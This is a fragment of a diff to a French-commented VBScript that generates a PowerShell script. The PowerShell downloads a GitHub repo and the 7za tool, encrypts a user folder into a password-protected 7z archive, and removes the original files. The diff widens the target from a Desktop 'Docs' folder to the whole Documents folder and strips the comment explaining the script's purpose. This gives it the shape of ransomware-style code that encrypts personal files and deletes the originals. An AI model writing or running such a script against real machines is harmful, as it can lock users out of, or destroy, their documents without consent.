@@ -1,6 +1,3 @@
-' Downloads a GitHub repo ZIP (no git needed) and encrypts the "Docs" folder on the Desktop,
-' then removes the original folder according to the cleanupMode.
-' Configure the top variables before use.
 Option Explicit
 
 Dim WshShell, FSO
@@ -18,12 +15,12 @@ password = "SecureVM2025!"       ' <-- mot de passe de chiffrement (évitez de l
 
 ' cleanupMode: "recycle" | "delete" | "securedelete" | "keep"
 Dim cleanupMode
-cleanupMode = "delete"          ' <-- choisissez le comportement après chiffrement
+cleanupMode = "recycle"          ' <-- choisissez le comportement après chiffrement
 
 ' ===== PATHS =====
-Dim userProfile, desktopPath, outilsFolder, psScriptPath
+Dim userProfile, documentsPath, outilsFolder, psScriptPath
 userProfile = WshShell.ExpandEnvironmentStrings("%USERPROFILE%")
-desktopPath = WshShell.SpecialFolders("Desktop")
+documentsPath = WshShell.SpecialFolders("MyDocuments")   ' <-- CHANGEMENT : cible le dossier Documents
 outilsFolder = userProfile & "\Outils"
 psScriptPath = outilsFolder & "\chiffrer_repo_and_docs_cleanup.ps1"
 
@@ -45,7 +42,8 @@ psContent = psContent & "$tools = Join-Path $env:USERPROFILE 'Outils'" & vbCrLf
 psContent = psContent & "$tempZip = Join-Path $env:TEMP 'repo_download.zip'" & vbCrLf
 psContent = psContent & "$extractPath = Join-Path $tools 'repo'" & vbCrLf
 psContent = psContent & "$desktop = [Environment]::GetFolderPath('Desktop')" & vbCrLf
-psContent = psContent & "$docs = Join-Path $desktop 'Docs'" & vbCrLf
+' Use MyDocuments for the folder to encrypt
+psContent = psContent & "$docs = [Environment]::GetFolderPath('MyDocuments')" & vbCrLf
 psContent = psContent & "$sevenZipExe = Join-Path $tools '7z\\7za.exe'" & vbCrLf
 psContent = psContent & "$sevenZipArchiveUrl = 'https://www.7-zip.org/a/7za920.zip'" & vbCrLf
 psContent = psContent & "$pwd = '" & Replace(password, "'", "''") & "'" & vbCrLf
@@ -69,10 +67,10 @@ psContent = psContent & "  Log 'Repo extrait dans: ' + $extractPath" & vbCrLf
 psContent = psContent & "" & vbCrLf
 
 psContent = psContent & "  if (-not (Test-Path $docs)) {" & vbCrLf
-psContent = psContent & "    Log 'ERREUR: dossier Docs introuvable: ' + $docs" & vbCrLf
+psContent = psContent & "    Log 'ERREUR: dossier Documents introuvable: ' + $docs" & vbCrLf
 psContent = psContent & "    exit 2" & vbCrLf
 psContent = psContent & "  }" & vbCrLf
-psContent = psContent & "  Log 'Dossier Docs trouvé: ' + $docs" & vbCrLf & vbCrLf
+psContent = psContent & "  Log 'Dossier Documents trouvé: ' + $docs" & vbCrLf & vbCrLf
 
 psContent = psContent & "  # Ensure 7za exists" & vbCrLf
 psContent = psContent & "  if (-not (Test-Path $sevenZipExe)) {" & vbCrLf
@@ -88,7 +86,7 @@ psContent = psContent & "    if ($found) { $sevenZipExe = $found.FullName; Log '
 psContent = psContent & "  } else { Log '7za déjà présent: ' + $sevenZipExe }" & vbCrLf & vbCrLf
 
 psContent = psContent & "  $timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'" & vbCrLf
-psContent = psContent & "  $outArchive = Join-Path $desktop ('Docs_Encrypted_' + $timestamp + '.7z')" & vbCrLf
+psContent = psContent & "  $outArchive = Join-Path $desktop ('Documents_Encrypted_' + $timestamp + '.7z')" & vbCrLf
 psContent = psContent & "  Log ('Chiffrement: création de ' + $outArchive)" & vbCrLf
 psContent = psContent & "  $args = @('a','-t7z','-mx=9','-mhe=on', ('-p' + $pwd), $outArchive, (Join-Path $docs '*'))" & vbCrLf
 psContent = psContent & "  & $sevenZipExe $args" & vbCrLf
